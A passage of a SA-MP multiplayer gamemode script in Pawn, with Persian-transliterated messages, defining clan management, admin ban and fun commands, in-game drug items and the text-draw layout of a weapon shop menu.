    if(sscanf(params, "s", txt)) return SendClientMessage(playerid, COLOR_WHITE, "[Error] /udb [text]");
    new msg[256];
    format(msg,sizeof(msg),"%s >> %d",PlayerInfo[playerid][pPass],udb_hash(txt));
    SendClientMessage(playerid,-1,msg);
    return 1;
}
COMMAND:relog(playerid, params[])
{
    new string[30];
    isRelogging[playerid] = true;
    GetPlayerIp(playerid, relogPlayerIP[playerid], 17);
    format(string, sizeof(string), "banip %s", relogPlayerIP[playerid]);
    SendRconCommand(string);
    SendClientMessage(playerid, -1, "Reconnecting...");
    return 1;
}
// --- Group
COMMAND:creategroup(playerid,params[])
{
if(PlayerInfo[playerid][pCash] <= 1000000) return SCM(playerid,-1,"Shoma Be $1.000.000 Niaz Darid");
if(PlayerInfo[playerid][pClan] != 0) return SendClientMessage(playerid, COLOR_GREY, "[Error] Shoma Group Drid!");
new type[128],targetid[128],amount[128];
    if(sscanf(params, "sss", targetid,type, amount))
    {
        SendClientMessage(playerid, COLOR_GREY, "USAGE: /CreateGroup [GroupName] [GroupTag] [GroupSlot]");
        return 1;
    }
     if(strlen(amount) > 2) SendClientMessage(playerid, COLOR_GREY, "[Error] Baraye Sakhtan Group Ba Slot Bishtar Az 10 VIP Niaz Darid");
     if(strlen(type) > 5) return SendClientMessage(playerid, COLOR_GREY, "[Error] Group Tag Bayad Kamtar Az 4 Kalame Bashad");
     if(strlen(targetid) > 11) return SendClientMessage(playerid, COLOR_GREY, "[Error] Group Name Bayad Kamtar Az 10 Kalame Bashad");
     GivePlayerMoneyEx(playerid,-1000000);
    new ctpath[256];
    GroupInfo[playerid][cNumbers] = dini_Int(cpath, "Numbers");
	GroupInfo[playerid][cNumbers]++;
    format(ctpath, sizeof(ctpath),"/clans/%d.ini",GroupInfo[playerid][cNumbers]);
    PlayerInfo[playerid][pRank] = 5;
    PlayerInfo[playerid][pClan] = GroupInfo[playerid][cNumbers];
   	dini_IntSet(cpath, "Numbers",GroupInfo[playerid][cNumbers]);
    dini_Create(ctpath);
    dini_Set(ctpath, "Name",targetid);
    dini_Set(ctpath, "Tag",type);
    dini_Set(ctpath, "Leader",amount);
    dini_Set(ctpath, "Slot",amount);
    dini_Set(ctpath, "Leader",GetName(playerid));
    dini_Set(ctpath, "Rank","Jadid");
    dini_Set(ctpath, "Rank1","Ozve Sabet");
    dini_Set(ctpath, "Rank2","Gunner");
    dini_Set(ctpath, "Rank3","Co-Leader");
    dini_Set(ctpath, "Rank4","Leader");
    SendClientMessage(playerid, COLOR_GREY, "Clan Shoma Sakhte Shod!");
    return 1;
}
COMMAND:ginv(playerid,params[])
{
	if(PlayerInfo[playerid][pClan] == 0) return SCM(playerid,-1,"Shoma Dar Hich Groupi Nistid");
	if(PlayerInfo[playerid][pRank] < 4) return SCM(playerid,-1,"Shoma bayad Leader Ya Rank 4 Bashid"); new id,rank;
	if(sscanf(params, "uu", id,rank)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: /ginv [playerid] [rank]");
	if(PlayerInfo[id][pClan] != 0) return SCM(playerid,-1,"Nmitavanid Invite Konid.");
	if(rank == 0) return SCM(playerid,-1,"Rank Bayad Az 1 Bishtar Bashad");
	if(!IsPlayerConnected(id) || id == playerid) return SCM(playerid,-1,"ID Ra Dorost Vared Konid");
	PlayerInfo[id][pRank] = rank;
 	PlayerInfo[id][pClan] =  PlayerInfo[playerid][pClan];
 	new msg[256];new ctpath[128]; format(ctpath, sizeof(ctpath),"/clans/%d.ini",PlayerInfo[playerid][pClan]);new name[128];format(name, sizeof(name),"%s",dini_Get(ctpath, "Name"));
 	format(msg,sizeof(msg),"{87db91}[Group] {ffffff}Leader {e5a7cb}%s  {ade07b}%s {ffffff}Ra Be Group %s Davat Kard",GetName(playerid),GetName(id),name);
 	SendClientMessageToAll(-1,msg);
 	return 1;

}
COMMAND:gkick(playerid,params[])
{
	if(PlayerInfo[playerid][pClan] == 0) return SCM(playerid,-1,"Shoma Clan Nadarid");
	if(PlayerInfo[playerid][pRank] < 4) return SCM(playerid,-1,"Shoma bayad Leader Ya Rank 4 Bashid"); new id;
	if(sscanf(params, "u", id)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: /gkick [playerid]");
	if(PlayerInfo[playerid][pClan] != PlayerInfo[id][pClan]) return SendClientMessage(playerid, COLOR_GREY, "Player Dar Clan Shoma Nist");
	if(!IsPlayerConnected(id) || id == playerid) return SCM(playerid,-1,"ID Ra Dorost Vared Konid");
	PlayerInfo[id][pRank] = 0;
 	PlayerInfo[id][pClan] = 0;
 	new msg[256];new ctpath[128]; format(ctpath, sizeof(ctpath),"/clans/%d.ini",PlayerInfo[playerid][pClan]);new name[128];format(name, sizeof(name),"%s",dini_Get(ctpath, "Name"));
 	format(msg,sizeof(msg),"{87db91}[Group] {ffffff}Leader {e5a7cb}%s  {ade07b}%s {ffffff}Ra Az Group %s Ekhraj Kard",GetName(playerid),GetName(id),name);
 	SendClientMessageToAll(-1,msg);
 	return 1;
}
COMMAND:gexit(playerid,params[])
{
	PlayerInfo[playerid][pRank] = 0;
 	PlayerInfo[playerid][pClan] = 0;
 	new msg[256];new ctpath[128]; format(ctpath, sizeof(ctpath),"/clans/%d.ini",PlayerInfo[playerid][pClan]);new name[128];format(name, sizeof(name),"%s",dini_Get(ctpath, "Name"));
 	format(msg,sizeof(msg),"{87db91}[Group] {ffffff}Player {e5a7cb}%s  {ffffff}Az Group %s KharejShod",GetName(playerid),name);
 	SendClientMessageToAll(-1,msg);
 	return 1;
}
COMMAND:gsetrank(playerid,params[])
{
	if(PlayerInfo[playerid][pClan] == 0) return SCM(playerid,-1,"Shoma Clan Nadarid");
	if(PlayerInfo[playerid][pRank] < 4) return SCM(playerid,-1,"Shoma bayad Leader Ya Rank 4 Bashid"); new id,rank;
	if(sscanf(params, "uu", id,rank)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: /gsetrank [playerid] [rank]");
	if(!IsPlayerConnected(id) || id == playerid) return SCM(playerid,-1,"ID Ra Dorost Vared Konid");
	if(PlayerInfo[playerid][pClan] != PlayerInfo[id][pClan]) return SendClientMessage(playerid, COLOR_GREY, "Player Dar Clan Shoma Nist");
	PlayerInfo[id][pRank] = rank;
 	new msg[256];new ctpath[128]; format(ctpath, sizeof(ctpath),"/clans/%d.ini",PlayerInfo[playerid][pClan]);new name[128];format(name, sizeof(name),"%s",dini_Get(ctpath, "Name"));
 	format(msg,sizeof(msg),"{87db91}[Group] {ffffff}Leader {e5a7cb}%s  {ade07b}%s {ffffff}Ra Az Group %s Ekhraj Kard",GetName(playerid),GetName(id),name);
 	SendClientMessageToAll(-1,msg);
 	return 1;
}
// --- end
COMMAND:ammo(playerid,params[])
{
if(PlayerInfo[playerid][pVip] == 0) return SCM(playerid,-1,"Shoma Bayad Vip Bashid");
MaxAmmo(playerid);
SCM(playerid,-1,"Ultimate Ammo Baraye Shoma Fa'al Shod !");
return 1;
}
COMMAND:ann(playerid,params[]){
  if(PlayerInfo[playerid][pAdmin] > 0){
  new gtext[256];
    if(sscanf(params,"s",gtext)){
      SendClientMessage(playerid, COLOR_WHITE, "Matni Vared Nshode");
      return 1;}
    format(gtext, sizeof(gtext), "%",GetName(playerid),gtext);
	GameTextForAll(gtext,4000,3);
}
  return 1;
}
COMMAND:banip(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 3) return SendClientMessage(playerid, -1, "Do Not Have Permission!");
    new
        type[ 128 ],
        string[ 128 ]
    ;
    if(sscanf(params, "s[128]", type)) SendClientMessage(playerid, -1, "Usage: /banip [IP]");
    else
    {
        format(string, sizeof(string),"banip %s", type);
        SendRconCommand(string);
        SendRconCommand("reloadbans");
        GameTextForPlayer(playerid,"~r~ IP Ban Anjam Shod",1000,4);
    }
    return true;
}
COMMAND:unbanip(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 3) return SendClientMessage(playerid, -1, "Do Not Have Permission!");
    new
        type[ 128 ],
        string[ 128 ]
    ;
    if(sscanf(params, "s[128]", type)) SendClientMessage(playerid, -1, "Usage: /unbanip [IP]");
    else
    {
        format(string, sizeof(string),"unbanip %s", type);
        SendRconCommand(string);
        SendRconCommand("reloadbans");
        GameTextForPlayer(playerid,"~r~ IP Un-Banned Shod",1000,4);
    }
    return true;
}
COMMAND:credits(playerid,params[])
{
	ShowPlayerDialog(playerid,1099,DIALOG_STYLE_MSGBOX,"Credits","Scripter Amir\n Tavajoh: MappinG Haye In Server(dust-2,Zombie,Sniper) Public Ast\nBeta Tester: oOMahdiOo And KinG_Da","Close","");
	return 1;
}
COMMAND:boom(playerid,params[])
{
    new string[400];
    new ID;
    new cmdreason[100];
	if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, -1, "Do Not Have Permission!");
    if(sscanf(params,"us",ID,cmdreason))
    {
        SendClientMessage(playerid,-1,"Syntax: /boom (Player Name/ID) (Dalil)");
        return 1;
    }
    if(!IsPlayerConnected(ID))
    {
        format(string,sizeof(string),"In Bazikon Dar Server Nemibashad.");
        SendClientMessage(playerid,-1,string);
        return 1;
    }
    new Float:x, Float:y, Float:z;
    GetPlayerPos(ID, x, y, z);
    CreateExplosion(x,y,z, 6, 10.0);

    format(string, sizeof(string), "{87db91}[BOOM] {B8860B}%s {ffffff}Player {B8860B}%s {ffffff}Ra Terekand. [Dalil: %s]",GetName(playerid),GetName(ID),cmdreason);
    SendClientMessageToAll(-1, string);
    return 1;
}
COMMAND:gdrug(playerid,params[])
{
    new targetid,type,string[200];
    if(sscanf(params, "ud", targetid, type)) return SendClientMessage(playerid, -1, "[Usage]: /gdrug [Part of Name/Player ID] [Amount]");
	if(type > PlayerInfo[playerid][pDrugs])return SendClientMessage(playerid,-1,"You do not have this amount!");
	if(targetid == playerid)return SendClientMessage(playerid,-1,"Give drug to himself?");
	PlayerInfo[playerid][pDrugs] -= type;
	PlayerInfo[targetid][pDrugs] +=type;
	format(string,sizeof(string),"{c0cfe8}Player %s Give Drug To %s [Number: %d]",GetName(playerid),GetName(targetid),type);
	SendClientMessageToNearPlayers(playerid,string);
	return 1;
}
COMMAND:usedrug(playerid,params[])
{
	if(PlayerInfo[playerid][pDrugs] > 1)
 	{
  		new Float:Health;new string[500];
		GetPlayerHealth(playerid, Health);
		if(Health >= 100) return SCM(playerid,-1,"You do not need");
		SetPlayerHealth(playerid, Health+25);
		SetPlayerWeather(playerid, -66);
		PlayerInfo[playerid][pDrugs] -= 1;
		SetTimerEx("Usedrugs", 5000, false, "d", playerid);
			format(string,sizeof(string),"{c0cfe8}Player %s Use Drug(/Usedrug)",GetName(playerid));
	SendClientMessageToNearPlayers(playerid,string);
	}
	else
	{
 		SendClientMessage(playerid, -1, "You do not have any drug.");
	}
 	return 1;
}
COMMAND:jetpack(playerid,params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1) return 1;
	JetPack[playerid] = 1;
    SetPlayerSpecialAction(playerid, 2);
    return 1;
}
COMMAND:d(playerid,params[])
{
 if(muted[playerid] == true) return SCM(playerid,-1,"You are mute");
	new pm[256],Strings[256];
	if(sscanf(params,"s",pm))return SCM(playerid,-1,"Enter text /d [Text]");
	format(Strings,sizeof(Strings),"{f2ee04}[Talk] %s : %s",GetName(playerid),pm);
    SendClientMessageToNearPlayers(playerid,Strings);
    return 1;
}
public loadtxd(playerid)
{

aktxd[playerid] = CreatePlayerTextDraw(playerid, 68.199966, 113.933326, "");
PlayerTextDrawLetterSize(playerid, aktxd[playerid], 0.000000, 0.000000);
PlayerTextDrawTextSize(playerid, aktxd[playerid], 146.000000, 103.000000);
PlayerTextDrawAlignment(playerid, aktxd[playerid], 1);
PlayerTextDrawColor(playerid, aktxd[playerid], -1);
PlayerTextDrawSetShadow(playerid, aktxd[playerid], 0);
PlayerTextDrawSetOutline(playerid, aktxd[playerid], 0);
PlayerTextDrawBackgroundColor(playerid, aktxd[playerid], 0);
PlayerTextDrawFont(playerid, aktxd[playerid], 5);
PlayerTextDrawSetProportional(playerid, aktxd[playerid], 0);
PlayerTextDrawSetShadow(playerid, aktxd[playerid], 0);
PlayerTextDrawSetSelectable(playerid, aktxd[playerid], true);
PlayerTextDrawSetPreviewModel(playerid, aktxd[playerid], 355);
PlayerTextDrawSetPreviewRot(playerid, aktxd[playerid], 0.000000, 0.000000, 0.000000, 2.400000);

m4txd[playerid] = CreatePlayerTextDraw(playerid, 253.800048, 106.466667, "");
PlayerTextDrawLetterSize(playerid, m4txd[playerid], 0.000000, 0.000000);
PlayerTextDrawTextSize(playerid, m4txd[playerid],189.000000, 137.000000);
PlayerTextDrawAlignment(playerid, m4txd[playerid], 1);
PlayerTextDrawColor(playerid, m4txd[playerid], -1);
PlayerTextDrawSetShadow(playerid, m4txd[playerid], 0);
PlayerTextDrawSetOutline(playerid, m4txd[playerid], 0);
PlayerTextDrawBackgroundColor(playerid, m4txd[playerid], 0);
PlayerTextDrawFont(playerid, m4txd[playerid], 5);
PlayerTextDrawSetProportional(playerid, m4txd[playerid], 0);
PlayerTextDrawSetShadow(playerid, m4txd[playerid], 0);
PlayerTextDrawSetSelectable(playerid, m4txd[playerid], true);
PlayerTextDrawSetPreviewModel(playerid, m4txd[playerid], 356);
PlayerTextDrawSetPreviewRot(playerid, m4txd[playerid], 0.000000, 0.000000, 0.000000, 2.400000);

snipetxd[playerid] = CreatePlayerTextDraw(playerid, 440.199707, 113.933334, "");
PlayerTextDrawLetterSize(playerid, snipetxd[playerid], 0.000000, 0.000000);
PlayerTextDrawTextSize(playerid, snipetxd[playerid], 206.000000, 112.000000);
PlayerTextDrawAlignment(playerid, snipetxd[playerid], 1);
PlayerTextDrawColor(playerid, snipetxd[playerid], -1);
PlayerTextDrawSetShadow(playerid, snipetxd[playerid], 0);
PlayerTextDrawSetOutline(playerid, snipetxd[playerid], 0);
PlayerTextDrawBackgroundColor(playerid, snipetxd[playerid], 0);
PlayerTextDrawFont(playerid, snipetxd[playerid], 5);
PlayerTextDrawSetProportional(playerid, snipetxd[playerid], 0);
PlayerTextDrawSetShadow(playerid, snipetxd[playerid], 0);
PlayerTextDrawSetSelectable(playerid, snipetxd[playerid], true);
PlayerTextDrawSetPreviewModel(playerid, snipetxd[playerid], 357);
PlayerTextDrawSetPreviewRot(playerid, snipetxd[playerid], 0.000000, 0.000000, 0.000000, 2.400000);

mp5txd[playerid] = CreatePlayerTextDraw(playerid, 20.999868, 207.266799, "");
PlayerTextDrawLetterSize(playerid, mp5txd[playerid], 0.000000, 0.000000);
PlayerTextDrawTextSize(playerid, mp5txd[playerid], 245.000000, 148.000000);
PlayerTextDrawAlignment(playerid, mp5txd[playerid], 1);
PlayerTextDrawColor(playerid, mp5txd[playerid], -1);
PlayerTextDrawSetShadow(playerid, mp5txd[playerid], 0);
PlayerTextDrawSetOutline(playerid, mp5txd[playerid], 0);
PlayerTextDrawBackgroundColor(playerid, mp5txd[playerid], 0);
PlayerTextDrawFont(playerid, mp5txd[playerid], 5);
PlayerTextDrawSetProportional(playerid, mp5txd[playerid], 0);
PlayerTextDrawSetShadow(playerid, mp5txd[playerid], 0);
PlayerTextDrawSetSelectable(playerid, mp5txd[playerid], true);
PlayerTextDrawSetPreviewModel(playerid, mp5txd[playerid], 353);
PlayerTextDrawSetPreviewRot(playerid, mp5txd[playerid], 0.000000, 0.000000, 0.000000, 2.400000);

sgtxd[playerid] = CreatePlayerTextDraw(playerid, 270.599945, 228.173461, "");
PlayerTextDrawLetterSize(playerid, sgtxd[playerid], 0.000000, 0.000000);
PlayerTextDrawTextSize(playerid, sgtxd[playerid], 155.000000, 94.000000);
PlayerTextDrawAlignment(playerid, sgtxd[playerid], 1);
PlayerTextDrawColor(playerid, sgtxd[playerid], -1);
PlayerTextDrawSetShadow(playerid, sgtxd[playerid], 0);
PlayerTextDrawSetOutline(playerid, sgtxd[playerid], 0);
PlayerTextDrawBackgroundColor(playerid, sgtxd[playerid], 0);
PlayerTextDrawFont(playerid, sgtxd[playerid], 5);
PlayerTextDrawSetProportional(playerid, sgtxd[playerid], 0);
PlayerTextDrawSetShadow(playerid, sgtxd[playerid], 0);
PlayerTextDrawSetSelectable(playerid, sgtxd[playerid], true);
PlayerTextDrawSetPreviewModel(playerid, sgtxd[playerid], 349);
PlayerTextDrawSetPreviewRot(playerid, sgtxd[playerid], 0.000000, 0.000000, 0.000000, 2.400000);

sawntxd[playerid] = CreatePlayerTextDraw(playerid, 449.799652, 217.720214, "");
PlayerTextDrawLetterSize(playerid, sawntxd[playerid], 0.000000, 0.000000);
PlayerTextDrawTextSize(playerid, sawntxd[playerid], 223.000000, 133.000000);
PlayerTextDrawAlignment(playerid, sawntxd[playerid], 1);
PlayerTextDrawColor(playerid, sawntxd[playerid], -1);
PlayerTextDrawSetShadow(playerid, sawntxd[playerid], 0);
PlayerTextDrawSetOutline(playerid, sawntxd[playerid], 0);
PlayerTextDrawBackgroundColor(playerid, sawntxd[playerid], 0);
PlayerTextDrawFont(playerid, sawntxd[playerid], 5);
PlayerTextDrawSetProportional(playerid, sawntxd[playerid], 0);
PlayerTextDrawSetShadow(playerid, sawntxd[playerid], 0);
PlayerTextDrawSetSelectable(playerid, sawntxd[playerid], true);
PlayerTextDrawSetPreviewModel(playerid, sawntxd[playerid], 350);
PlayerTextDrawSetPreviewRot(playerid, sawntxd[playerid], 0.000000, 0.000000, 0.000000, 2.400000);

buytxd[playerid] = CreatePlayerTextDraw(playerid, 307.599975, 363.973388, "Buy");
PlayerTextDrawLetterSize(playerid, buytxd[playerid], 0.513599, 1.868799);
PlayerTextDrawTextSize(playerid,close[playerid], 100.400000, 100.600000);
PlayerTextDrawAlignment(playerid, buytxd[playerid], 1);
PlayerTextDrawColor(playerid, buytxd[playerid], -1);
PlayerTextDrawSetShadow(playerid, buytxd[playerid], 0);
PlayerTextDrawSetOutline(playerid, buytxd[playerid], 1);
PlayerTextDrawBackgroundColor(playerid, buytxd[playerid], 255);
PlayerTextDrawFont(playerid, buytxd[playerid], 3);
PlayerTextDrawSetProportional(playerid, buytxd[playerid], 1);
PlayerTextDrawSetShadow(playerid, buytxd[playerid], 0);
PlayerTextDrawSetSelectable(playerid, buytxd[playerid], true);

shotgunlevel[playerid] = CreatePlayerTextDraw(playerid, 308.399749, 306.480041, "Level shotgun");
PlayerTextDrawLetterSize(playerid, shotgunlevel[playerid], 0.400000, 1.600000);
PlayerTextDrawAlignment(playerid, shotgunlevel[playerid], 3);
PlayerTextDrawColor(playerid, shotgunlevel[playerid], -1);
PlayerTextDrawSetShadow(playerid, shotgunlevel[playerid], 0);
PlayerTextDrawSetOutline(playerid, shotgunlevel[playerid], 0);
PlayerTextDrawBackgroundColor(playerid, shotgunlevel[playerid], 255);
PlayerTextDrawFont(playerid, shotgunlevel[playerid], 1);
PlayerTextDrawSetProportional(playerid, shotgunlevel[playerid], 1);
PlayerTextDrawSetShadow(playerid, shotgunlevel[playerid], 0);

sawnlevel[playerid] = CreatePlayerTextDraw(playerid, 505.999542, 304.239959, "Level sawn");
PlayerTextDrawLetterSize(playerid, sawnlevel[playerid], 0.400000, 1.600000);
PlayerTextDrawAlignment(playerid, sawnlevel[playerid], 3);
PlayerTextDrawColor(playerid, sawnlevel[playerid], -1);
PlayerTextDrawSetShadow(playerid, sawnlevel[playerid], 0);
PlayerTextDrawSetOutline(playerid, sawnlevel[playerid], 0);
PlayerTextDrawBackgroundColor(playerid, sawnlevel[playerid], 255);
PlayerTextDrawFont(playerid, sawnlevel[playerid], 1);
PlayerTextDrawSetProportional(playerid, sawnlevel[playerid], 1);
PlayerTextDrawSetShadow(playerid, sawnlevel[playerid], 0);


m4level[playerid] = CreatePlayerTextDraw(playerid, 311.599884, 196.720016, "Level m4");
PlayerTextDrawLetterSize(playerid, m4level[playerid], 0.400000, 1.600000);
PlayerTextDrawAlignment(playerid, m4level[playerid], 3);
PlayerTextDrawColor(playerid, m4level[playerid], -1);
PlayerTextDrawSetShadow(playerid, m4level[playerid], 0);
PlayerTextDrawSetOutline(playerid, m4level[playerid], 0);
PlayerTextDrawBackgroundColor(playerid, m4level[playerid], 255);
PlayerTextDrawFont(playerid, m4level[playerid], 1);
PlayerTextDrawSetProportional(playerid, m4level[playerid], 1);
PlayerTextDrawSetShadow(playerid, m4level[playerid], 0);

snipelevel[playerid] = CreatePlayerTextDraw(playerid, 495.599548, 195.973403, "Level rifle");
PlayerTextDrawLetterSize(playerid, snipelevel[playerid], 0.400000, 1.600000);
PlayerTextDrawAlignment(playerid, snipelevel[playerid], 3);
PlayerTextDrawColor(playerid, snipelevel[playerid], -1);
PlayerTextDrawSetShadow(playerid, snipelevel[playerid], 0);
PlayerTextDrawSetOutline(playerid, snipelevel[playerid], 0);
PlayerTextDrawBackgroundColor(playerid, snipelevel[playerid], 255);
PlayerTextDrawFont(playerid, snipelevel[playerid], 1);
PlayerTextDrawSetProportional(playerid, snipelevel[playerid], 1);
PlayerTextDrawSetShadow(playerid, snipelevel[playerid], 0);

mp5level[playerid] = CreatePlayerTextDraw(playerid, 96.399856, 305.733489, "Level mp5");
PlayerTextDrawLetterSize(playerid, mp5level[playerid], 0.400000, 1.600000);
PlayerTextDrawAlignment(playerid, mp5level[playerid], 3);
PlayerTextDrawColor(playerid, mp5level[playerid], -1);
PlayerTextDrawSetShadow(playerid, mp5level[playerid], 0);
PlayerTextDrawSetOutline(playerid, mp5level[playerid], 0);
PlayerTextDrawBackgroundColor(playerid, mp5level[playerid], 255);
PlayerTextDrawFont(playerid, mp5level[playerid], 1);
PlayerTextDrawSetProportional(playerid, mp5level[playerid], 1);
PlayerTextDrawSetShadow(playerid, mp5level[playerid], 0);

aklevel[playerid] = CreatePlayerTextDraw(playerid, 109.999916, 196.720031, "Level ak");
PlayerTextDrawLetterSize(playerid, aklevel[playerid], 0.400000, 1.600000);
PlayerTextDrawAlignment(playerid, aklevel[playerid], 3);
PlayerTextDrawColor(playerid, aklevel[playerid], -1);
PlayerTextDrawSetShadow(playerid, aklevel[playerid], 0);
PlayerTextDrawSetOutline(playerid, aklevel[playerid], 0);
PlayerTextDrawBackgroundColor(playerid, aklevel[playerid], 255);
PlayerTextDrawFont(playerid, aklevel[playerid], 1);
PlayerTextDrawSetProportional(playerid, aklevel[playerid], 1);
PlayerTextDrawSetShadow(playerid, aklevel[playerid], 0);
PlayerTextDrawSetSelectable(playerid, aklevel[playerid], false);

close[playerid] = CreatePlayerTextDraw(playerid, 5.633341, 395.543426, "Close");
PlayerTextDrawTextSize(playerid,close[playerid], 100.400000, 100.600000);
PlayerTextDrawLetterSize(playerid, close[playerid], 0.400000, 1.600000);
PlayerTextDrawAlignment(playerid, close[playerid], 1);
PlayerTextDrawColor(playerid, close[playerid], -1);
PlayerTextDrawSetShadow(playerid, close[playerid], 0);
PlayerTextDrawSetOutline(playerid, close[playerid], 0);
PlayerTextDrawBackgroundColor(playerid, close[playerid], 255);
PlayerTextDrawFont(playerid, close[playerid], 1);
PlayerTextDrawSetProportional(playerid, close[playerid], 1);
PlayerTextDrawSetShadow(playerid, close[playerid], 0);
PlayerTextDrawSetSelectable(playerid, close[playerid], true);


}
